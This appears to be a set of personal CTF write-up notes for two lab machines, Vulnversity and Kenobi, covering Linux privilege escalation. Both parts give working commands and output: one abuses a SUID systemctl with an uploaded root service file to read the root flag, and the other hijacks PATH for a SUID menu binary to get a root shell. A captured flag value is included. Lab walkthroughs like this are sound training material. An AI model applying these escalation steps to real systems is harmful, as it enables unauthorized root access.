## Vulnversity
### Priv escalation
Find SUID files on the victim
  
    find / -perm -u=s -type f 2>/dev/null
    /usr/bin/newuidmap
    ...
    /bin/systemctl
     ...

On the attacker create the following service configuration file as service01.phtml

    [Unit]
    Description=Service 01
    
    [Service]
    Type=simple
    User=root
    ExecStart=/bin/bash -c 'cat /root/root.txt'
    
    [Install]
    WantedBy=multi-user.target

Upload the file using the form to the victim, (http://10.10.13.154:3333/internal/) then execute the following steps

    cd /var/www/html/internal/uploads
    mv service01.phtml service01.service
    /bin/systemctl enable /var/www/html/internal/uploads/service01.service
      Created symlink from /etc/systemd/system/multi-user.target.wants/service01.service to /var/www/html/internal/uploads/service01.service.
      Created symlink from /etc/systemd/system/service01.service to /var/www/html/internal/uploads/service01.service.
Them start the service

    /bin/systemctl status service01
Check the execution to get the flag: a58ff8579f0a9270368d33a9966c7fd5

    /bin/systemctl status service01
    * service01.service - Service 01
       Loaded: loaded (/var/www/html/internal/uploads/service01.service; enabled; vendor preset: enabled)
       Active: inactive (dead) since Mon 2024-04-29 06:38:29 EDT; 1min 4s ago
      Process: 12889 ExecStart=/bin/bash -c cat /root/root.txt (code=exited, status=0/SUCCESS)
     Main PID: 12889 (code=exited, status=0/SUCCESS)
    
    Apr 29 06:38:29 vulnuniversity systemd[1]: Started Service 01.
    Apr 29 06:38:29 vulnuniversity bash[12889]: a58ff8579f0a9270368d33a9966c7fd5

## Kenobi
### Priv escalation
Search SUID file

    find / -perm -u=s -type f 2>/dev/null
    ...
    /usr/bin/menu
    ...

Check readable strings inside the file

    strings /usr/bin/menu 
      []A\A]A^A_
      ***************************************
      1. status check
      2. kernel version
      3. ifconfig
      ** Enter your choice :
      curl -I localhost
      uname -r
      ifconfig
       Invalid choice
      ;*3$"

The binary call 3 commands: curl, kernel, ifconfig, without specifing the full path. This allows us to create a malicious version of once of the executed command, e.g. 

    echo "/bin/sh" > ifconfig
    chmod ugo+x ifconfig 
Executing the command we get a shell

      kenobi@kenobi:~$ ./ifconfig 
      $ 

Inspecting the PATH enviroment variable>

    echo $PATH
      /home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
We can see that the user bin directory is in the PATH, we can just move to this directory our ifconfig:

    $ pwd
      /home/kenobi
    $ mkdir bin
    $ mv ifconfig bin/
    $ /home/kenobi/bin/ifconfig 
    $ whoami
    kenobi

Now exit from the current session and try the exploit:

    kenobi@kenobi:~$ menu
    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :3
    # whoami
    root
We got a shell as root


  
    
    



